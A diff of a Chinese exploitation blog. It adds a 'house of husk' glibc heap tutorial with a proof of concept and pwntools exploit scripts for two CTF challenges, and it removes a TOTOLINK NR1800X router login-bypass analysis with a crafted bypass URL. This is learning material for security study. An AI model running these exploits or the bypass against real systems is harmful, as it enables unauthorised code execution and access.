-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta \ </span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append "root=/dev/sda1 console=tty0" -nographic \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></tbody></table></figure>
+<p>这里就会调用__parse_one_specmb函数 这是最关键劫持的函数</p>
+<h3 id="5-parse-one-specmb-any-addr"><a href="#5-parse-one-specmb-any-addr" class="headerlink" title="5. __parse_one_specmb->any addr"></a>5. __parse_one_specmb-&gt;any addr</h3><p>__parse_one_specmb的源码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#ifdef COMPILE_WPRINTF</span><br><span class="line">__parse_one_specwc (const UCHAR_T *format, size_t posn,</span><br><span class="line">		    struct printf_spec *spec, size_t *max_ref_arg)</span><br><span class="line">#else</span><br><span class="line">__parse_one_specmb (const UCHAR_T *format, size_t posn,</span><br><span class="line">		    struct printf_spec *spec, size_t *max_ref_arg)</span><br><span class="line">#endif</span><br><span class="line">{</span><br><span class="line">  unsigned int n;</span><br><span class="line">  size_t nargs = 0;</span><br><span class="line"></span><br><span class="line">  /* Skip the '%'.  */</span><br><span class="line">  ++format;</span><br><span class="line">-----------------------------------关键代码</span><br><span class="line">if (__builtin_expect (__printf_function_table == NULL, 1)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == NULL</span><br><span class="line">    /* We don't try to get the types for all arguments if the format</span><br><span class="line">uses more than one.  The normal case is covered though.  If</span><br><span class="line">the call returns -1 we continue with the normal specifiers.  */</span><br><span class="line">    || (int) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">		   (&amp;spec-&gt;info, 1, &amp;spec-&gt;data_arg_type,</span><br><span class="line">		    &amp;spec-&gt;size)) &lt; 0)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
-<p>再配置宿主机</p>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.12 up</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>这里补充一下parse_one_specwc<code>还是</code>parse_one_specmb都会执行函数体</p>
+<p>然后注意下这个*__printf_arginfo_table[spec-&gt;info.spec]  这里会调用这个位置，这也就是我们进行后门函数和ogg覆盖的位置</p>
+<p>这里为了介绍一下spec要讲一下__register_printf_function函数，该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/* Register FUNC to be called to format SPEC specifiers.  */</span><br><span class="line">int</span><br><span class="line">__register_printf_specifier (int spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">{</span><br><span class="line">  if (spec &lt; 0 || spec &gt; (int) UCHAR_MAX)   #UCHAR_MAX=0xff</span><br><span class="line">    {</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      return -1;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  int result = 0;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  if (__printf_function_table == NULL)</span><br><span class="line">    {</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	calloc (UCHAR_MAX + 1, sizeof (void *) * 2);</span><br><span class="line">      if (__printf_arginfo_table == NULL)</span><br><span class="line">	{</span><br><span class="line">	  result = -1;</span><br><span class="line">	  goto out;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + 1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
-<p>将文件复制到虚拟环境中</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.2.12:/root/</span><br></pre></td></tr></tbody></table></figure>
+<p>分析一下代码，上面代码先做了一个判断 判断spec是否存在ascil码，再判断__printf_function_table == NULL  就设定一个calloc来分配两个索引表，并将地址存放到<code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p>
+<p>回到我们的利用链条，发现这里只要修改，假设是%X的情况 就是修改__printf_arginfo_table(88)的位置，修改原定的函数处理函数进行函数劫持</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p><code>poc</code> 源自 <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="line">#define MAIN_ARENA       0x3ebc40</span><br><span class="line">#define MAIN_ARENA_DELTA 0x60</span><br><span class="line">#define GLOBAL_MAX_FAST  0x3ed940</span><br><span class="line">#define PRINTF_FUNCTABLE 0x3f0658</span><br><span class="line">#define PRINTF_ARGINFO   0x3ec870</span><br><span class="line">#define ONE_GADGET       0x10a38c</span><br><span class="line"></span><br><span class="line">int main (void)</span><br><span class="line">{</span><br><span class="line">  unsigned long libc_base;</span><br><span class="line">  char *a[10];</span><br><span class="line">  setbuf(stdout, NULL); // make printf quiet</span><br><span class="line"></span><br><span class="line">  /* leak libc */</span><br><span class="line">  a[0] = malloc(0x500); /* UAF chunk */</span><br><span class="line">  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[3] = malloc(0x500); /* avoid consolidation */</span><br><span class="line">  free(a[0]);</span><br><span class="line">  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  printf("libc @ 0x%lxn", libc_base);</span><br><span class="line"></span><br><span class="line">  /* prepare fake printf arginfo table */</span><br><span class="line">  *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;</span><br><span class="line">  //*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;</span><br><span class="line">    //now __printf_arginfo_table['X'] = one_gadget;</span><br><span class="line"></span><br><span class="line">  /* unsorted bin attack */</span><br><span class="line">  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;</span><br><span class="line">  a[0] = malloc(0x500); /* overwrite global_max_fast */</span><br><span class="line"></span><br><span class="line">  /* overwrite __printf_arginfo_table and __printf_function_table */</span><br><span class="line">  free(a[1]);// __printf_function_table =&gt; a heap_addr which is not NULL</span><br><span class="line">  free(a[2]);//__printf_arginfo_table =&gt; one_gadget</span><br><span class="line"></span><br><span class="line">  /* ignite! */</span><br><span class="line">  printf("%X", 0);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
-<p>遇到了一个报错</p>
-<p><img src="/pic/TOTOLINK_NR1800X/6.png" alt="img"></p>
-<p>我们要指定ssh客户端使用的密钥类型</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -r squashfs-root/ root@172.26.71.12:/root/</span><br></pre></td></tr></tbody></table></figure>
+<p>这个poc 模拟了一次uaf 和 unsorted bin攻击 ，最关键的点 在于通过覆盖global_max_fast为<code>main_arena+88</code>从而使得释放的所有块都按fastbin处理，然后通过计算好 printf_arginfo_table ，printf_function_table 与main_arena之间差距的size 来修改，因为fastbin的堆块地址会存放在main_arena中，从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针，一直往后推，我们将阈值改为<code>0x7f*</code>导致几乎所有sz的chunk都被当做fastbin，其地址会从main_arena+8开始，根据size不同往libc覆写堆地址，</p>
+<p>通过uaf + unsorted bin覆盖globale_max_fast这样的方式来使得printf_arginfo_table为堆上地址，然后设置printf_arginfo_table[88]为ogg即可</p>
+<p><strong>覆盖global_max_fast</strong></p>
+<p><img src="/pic/house_of_husk/1.png" alt="img"></p>
+<p><img src="/pic/house_of_husk/2.png" alt="img"></p>
+<p>main_arena+8=0x7ffff7dcfc48 </p>
+<p>__printf_function_table=0x7ffff7dd4658</p>
+<p>offset1=0x4A10= 0x9430 /2-0x10+8</p>
+<p>__printf_arginfo_table=0x7ffff7dd0870</p>
+<p>offset2=C28=0x1860/2-0x10+8</p>
+<p>执行完两个free后：</p>
+<p><img src="/pic/house_of_husk/3.png" alt="img"></p>
+<p>这里我们就劫持了__printf_arginfo_table这个位置且这个位置__print_arginfo_table[88]已经是ogg了</p>
+<p><img src="/pic/house_of_husk/4.png" alt="img"></p>
+<p>接下来看一下printf的调用链</p>
+<p>进入do_positional</p>
+<p><img src="/pic/house_of_husk/5.png" alt="img"></p>
+<p>进入printf_positional</p>
+<p><img src="/pic/house_of_husk/6.png" alt="img"></p>
+<p>调用进入__parse_one_specmb</p>
+<p><img src="/pic/house_of_husk/7.png" alt="img"></p>
+<p>劫持</p>
+<p><img src="/pic/house_of_husk/8.png" alt="img"></p>
+<p>纸上得来终觉浅，绝知此事要躬行 接下来通过几道例题去更熟悉这个house of husk</p>
+<h2 id="例题readme-revenge"><a href="#例题readme-revenge" class="headerlink" title="例题readme_revenge"></a>例题readme_revenge</h2><p><img src="/pic/house_of_husk/9.png" alt="img"></p>
+<p><img src="/pic/house_of_husk/10.png" alt="img"></p>
+<p>没开pie 且是静态编译 这里只有一次读入 和printf 利用</p>
+<p>关键思路：由于第一次读入没有进行限制，导致可以覆盖name地址后面的值 通过动态调试可以发现</p>
+<p><img src="/pic/house_of_husk/11.png" alt="img"></p>
+<p>是可以通过读入来进行覆盖的， 这里的下一个难点是如何get shell程序是无法泄露libc且没有后门的，但是我们发现已经存在flag(这里感觉得靠经验 一般调试可能看不到)</p>
+<p><img src="/pic/house_of_husk/12.png" alt="img"></p>
+<p>然后再劫持 <code>*__printf_arginfo_table[spec-&gt;info.spec]</code> 这个位置为 <code>__stack_chk_fail()</code> ，该函数执行时，会打印出 <code>__libc_argv[0]</code> 指向的字符串，然后把__libc_argv[0]的位置设置为flag的地址就可以了，还是挺巧妙的 一个任意读取刚好能满足以上所有条件</p>
+<p><img src="/pic/house_of_husk/13.png" alt="img"></p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./readme_revenge"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">leak_flag=0x4359B0</span><br><span class="line">flag_addr=0x6B4040</span><br><span class="line">payload=p64(flag_addr)+b'a'*0x598</span><br><span class="line">payload+=p64(0x6B73E0)#__libc_argv[0]</span><br><span class="line">payload+=b'a'*(0x640-0x5a0)</span><br><span class="line">payload+=p64(0xdeadbeef)#__printf_function_table</span><br><span class="line">payload+=p64(0x0)#__printf_modifier_table</span><br><span class="line">payload+=b'a'*0x70</span><br><span class="line">payload+=p64(0x6b7aa8)#__printf_arginfo_table</span><br><span class="line">payload+=p64(0xdeadbeef)*0x72</span><br><span class="line">payload+=p64(leak_flag)#__stack_chk_fail</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/pic/TOTOLINK_NR1800X/7.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></tbody></table></figure>
+<p>这道题出的十分巧妙，但有种为了出题而出的感觉？感觉这种还是要落实到堆 看下面一题</p>
+<h2 id="DASCTF-X-HDCTF-2024-最喜欢的一集"><a href="#DASCTF-X-HDCTF-2024-最喜欢的一集" class="headerlink" title="DASCTF X HDCTF 2024 最喜欢的一集"></a>DASCTF X HDCTF 2024 最喜欢的一集</h2><p><img src="/pic/house_of_husk/14.png" alt="img"></p>
+<p>标准的堆题 存在一次uaf和一次edit和一次show，free只有第一次可以uaf，然后存在一个函数可以进行任意地址的一字节写，add只能分配0x4ff到0x540之间，</p>
+<p>核心思路：通过uaf 来泄露libc和heap_addr的地址，因为要用到large bin attack的攻击 所以要知道堆地址，然后通过large bin attack进行任意地址写，将chunk的地址覆盖__printf_arginfo_table来进行劫持，再通过任意地址一字节写，让__printf_function_table的值不为0,在chunk的位置也就是0x73*8-0x10(这里是因为s的ascil码是73)布置ogg</p>
+<p>泄露地址部分：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add('b',0x520,'a')#0</span><br><span class="line">add('b',0x520,'a')#1</span><br><span class="line">add('b',0x500,'a')#2</span><br><span class="line">add('b',0x500,'b')#3</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br></pre></td></tr></tbody></table></figure>
 
-<p>在执行命令启动环境</p>
-<p><img src="/pic/TOTOLINK_NR1800X/8.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/9.png" alt="img"></p>
-<p>成功启动环境</p>
-<h3 id="登录验证绕过漏洞分析"><a href="#登录验证绕过漏洞分析" class="headerlink" title="登录验证绕过漏洞分析"></a>登录验证绕过漏洞分析</h3><p>先通过抓包观察</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1</span><br><span class="line">Host: 192.168.2.12</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http://192.168.2.12</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.2.12/login.html</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=55555</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/pic/house_of_husk/15.png" alt="img"></p>
+<p>shell:</p>
+<p><img src="/pic/house_of_husk/16.png" alt="img"></p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: mx.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">sl = lambda data: mx.sendline(data)</span><br><span class="line">rl = lambda data: mx.recvuntil(data)</span><br><span class="line">re = lambda data: mx.recv(data)</span><br><span class="line">sa = lambda data, content: mx.sendafter(data,content)</span><br><span class="line">inter = lambda: mx.interactive()</span><br><span class="line">l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">heap64=lambda:u64(mx.recvuntil(b'\x56')[-6:].ljust(8,b'\x00'))</span><br><span class="line"></span><br><span class="line">h64=lambda:u64(mx.recv(8)[2:8].ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: mx.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(mx)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./zuixihuandeyiji"</span><br><span class="line">mx = process(filename)</span><br><span class="line">#mx = remote("node5.anna.nssctf.cn",24071)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">def add(name,length,content):</span><br><span class="line">    rl("Please input your choice: \n")</span><br><span class="line">    sl(str(1))</span><br><span class="line">    rl("Please leave your name: ")</span><br><span class="line">    sl(name)</span><br><span class="line">    rl("Please input the length of your desciption: ")</span><br><span class="line">    sl(str(length))</span><br><span class="line">    rl("Please input the content of your desciption: ")</span><br><span class="line">    sl(content)</span><br><span class="line">def delete(num):</span><br><span class="line">    rl("Please input your choice: \n")</span><br><span class="line">    sl(str(2))</span><br><span class="line">    rl("Please input the index of the people: ")</span><br><span class="line">    sl(str(num))</span><br><span class="line">def edit(num,name,content):</span><br><span class="line">    rl("Please input your choice: \n")</span><br><span class="line">    sl(str(3))</span><br><span class="line">    rl("Please input the index of the people: ")</span><br><span class="line">    sl(str(num))</span><br><span class="line">    rl("Please input the name of the people: ")</span><br><span class="line">    sl(name)</span><br><span class="line">    rl("Please input the content of the desciption: ")</span><br><span class="line">    sl(content)</span><br><span class="line">def show(num):</span><br><span class="line">    rl("Please input your choice: \n")</span><br><span class="line">    sl(str(4))</span><br><span class="line">    rl("Please input the index of the people: ")</span><br><span class="line">    sl(str(num))</span><br><span class="line">dbg()</span><br><span class="line">add('b',0x520,'a')#0</span><br><span class="line">add('b',0x520,'a')#1</span><br><span class="line">add('b',0x500,'a')#2</span><br><span class="line">add('b',0x500,'b')#3</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=l64()-0x1ebbe0</span><br><span class="line">heap_addr=h64()</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line">log_addr(heap_addr)</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">__printf_arginfo_table=0x1f1350+libc_addr</span><br><span class="line">__printf_function_table=libc_addr+0x1f0ff8</span><br><span class="line">log_addr(__printf_arginfo_table)</span><br><span class="line">ogg=libc_addr+0xe6aee</span><br><span class="line">#0xe6aee 0xe6af1 0xe6af4</span><br><span class="line">shell=b'a'*(0x73*8-0x10)+p64(ogg)</span><br><span class="line">add('b',0x500,shell)#2</span><br><span class="line">add('b',0x530,'b')#4</span><br><span class="line">pause()</span><br><span class="line">delete(2)</span><br><span class="line">payload=p64(libc_addr+0x1ec010)*2+p64(heap_addr-0xa60)+p64(__printf_arginfo_table-0x20)</span><br><span class="line">edit(0,'b',payload)</span><br><span class="line">add('b',0x530,'a')#6</span><br><span class="line">rl("Please input your choice: \n")</span><br><span class="line">sl(str(255))</span><br><span class="line">rl("Maybe Do you like IU?\n")</span><br><span class="line">sl(b'y')</span><br><span class="line">rl("Give you a reward!\n")</span><br><span class="line">sl(p64(__printf_function_table))</span><br><span class="line">s(str(2))</span><br><span class="line">rl("Please input your choice: \n")</span><br><span class="line">sl(str(266))</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
 
-<p>响应包</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Location: http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</span><br><span class="line">Date: Mon, 29 Jul 2024 08:07:07 GMT</span><br><span class="line">Server: lighttpd/1.4.20</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">protal page</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>对第一个包进行分析</p>
-<p>POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1  可以知道在cstecgi.cgi中，我们跟进分析，可以根据第一个抓包的内容跟踪程序执行流</p>
-<p><img src="/pic/TOTOLINK_NR1800X/10.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/11.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/12.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/13.png" alt="img"></p>
-<p>而off_44C074对应的是 sub_42AEEC函数</p>
-<p><img src="/pic/TOTOLINK_NR1800X/14.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/15.png" alt="img"></p>
-<p>从我们第二个包的分析中可以看出程序执行的是红框框的那部分 <a href="http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login">http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</a></p>
-<p>可以跟踪authCode 在lighttpd程序中定位到Form_Login</p>
-<p><img src="/pic/TOTOLINK_NR1800X/16.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/17.png" alt="img"></p>
-<p>根据动态调试</p>
-<p><img src="/pic/TOTOLINK_NR1800X/18.png" alt="img"><br>goURL就是接下来要访问的html文件，authCode则是验证是否正确登录的一个值，goURL要么设置为home.html要么不设置</p>
-<p>因此我们可以构造下面的url，来绕过登录，进入后台，并且可以获取到cookie的SESSION_ID。</p>
-<p><a href="http://192.168.2.12/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=aaa&amp;goURL=home.html&amp;action=login">http://192.168.2.12/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=aaa&amp;goURL=home.html&amp;action=login</a></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.2.12/formLoginAuth.htm?username=admin&amp;password=55555&amp;authCode=1&amp;goURL=home.html&amp;action=login</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/pic/TOTOLINK_NR1800X/19.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>iot</category>
-        <category>漏洞复现</category>
-        <category>TOTOLINK</category>
+        <category>pwn学习</category>
+        <category>堆利用</category>
       </categories>
       <tags>
-        <tag>漏洞复现---登录验证绕过</tag>
+        <tag>house_of</tag>
       </tags>
   </entry>
   <entry>
@@ -345,178 +503,90 @@ stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
       </tags>
   </entry>
   <entry>
-    <title>house-of-cat</title>
-    <url>/2024/08/14/house%20of%20cat/</url>
-    <content><![CDATA[<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><h3 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h3><h1 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h1><p>–能<strong>任意写</strong>一个<strong>可控</strong>地址（如largebin attack）</p>
-<p>–能泄露 libc 地址和 heap 地址</p>
-<p>–能触发 <strong>IO 流</strong>（三种方式）</p>
-<p>​		1.调用exit或从main退出</p>
-<p>​		2. puts、printf函数调用</p>
-<p>​		3. _malloc_assert</p>
-<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h1><p>关键点:</p>
-<p>两条io链条:</p>
-<p>**1.malloc_assert -&gt; fxprintf -&gt; vfxprintf-&gt;locked_vfxprintf -&gt; vfprintf_internal -&gt; IO-&gt;vtable-&gt;_IO_file_xsputn–&gt;IO_wfile_seekoff **</p>
-<p><strong>2.IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode-&gt;IO_WOVERFLOW</strong></p>
-<p>攻击脚本如下：</p>
-<p>fake_io的伪造</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">fake_struct = p64(0) #_IO_read_end</span><br><span class="line">fake_struct += p64(0) #_IO_read_base</span><br><span class="line">fake_struct += p64(0) #_IO_write_base</span><br><span class="line">fake_struct += p64(0) #_IO_write_ptr</span><br><span class="line">fake_struct += p64(0) #_IO_write_end</span><br><span class="line">fake_struct += p64(0) #_IO_buf_base</span><br><span class="line">fake_struct += p64(1) #_IO_buf_end</span><br><span class="line">fake_struct += p64(0) #_IO_save_base</span><br><span class="line">fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx</span><br><span class="line">fake_struct += p64(setcontext + 61) #_IO_save_end = call_addr</span><br><span class="line">fake_struct += p64(0)  #_markers</span><br><span class="line">fake_struct += p64(0)  #_chain</span><br><span class="line">fake_struct += p64(0)  #_fileno</span><br><span class="line">fake_struct += p64(0)  #_old_offset</span><br><span class="line">fake_struct += p64(0)  #_cur_column</span><br><span class="line">fake_struct += p64(heap_base + 0x200) #_lock = heap_addr or writeable libc_addr</span><br><span class="line">fake_struct += p64(0) #_offset</span><br><span class="line">fake_struct += p64(0) #_codecvx</span><br><span class="line">fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1</span><br><span class="line">fake_struct += p64(0) #_freers_list</span><br><span class="line">fake_struct += p64(0) #_freers_buf</span><br><span class="line">fake_struct += p64(0) #__pad5</span><br><span class="line">fake_struct += p32(0) #_mode</span><br><span class="line">fake_struct += b"\x00"*20 #_unused2</span><br><span class="line">fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable</span><br><span class="line">fake_struct += p64(0)*6 #padding</span><br><span class="line">fake_struct += p64(fake_io_addr + 0x40) #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span><br></pre></td></tr></tbody></table></figure>
+    <title>TOTOLINK_NR1800X Multi-vulnerability analysis</title>
+    <url>/2024/08/17/TOTOLINK_NR1800X%20Multi-vulnerability%20analysis/</url>
+    <content><![CDATA[<h2 id="固件提取："><a href="#固件提取：" class="headerlink" title="固件提取："></a>固件提取：</h2><figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.totolink.net/home</span><span class="regexp">/menu/detail</span><span class="regexp">/menu_listtpl/download</span><span class="regexp">/id/</span><span class="number">225</span>/ids/<span class="number">36</span>.html</span><br></pre></td></tr></tbody></table></figure>
 
-<p>接下来通过源码调试加io链条的路线去解析这个脚本的由来，以及整个路线的分析</p>
-<h2 id="注意事项！！！"><a href="#注意事项！！！" class="headerlink" title="注意事项！！！"></a>注意事项！！！</h2><p>写调试脚本的时候p stderr的值不是我们要的 我们要找的是存放它的值然后修改是p &amp;stderr，这里卡了我挺久的……..我是说怎么调试不对</p>
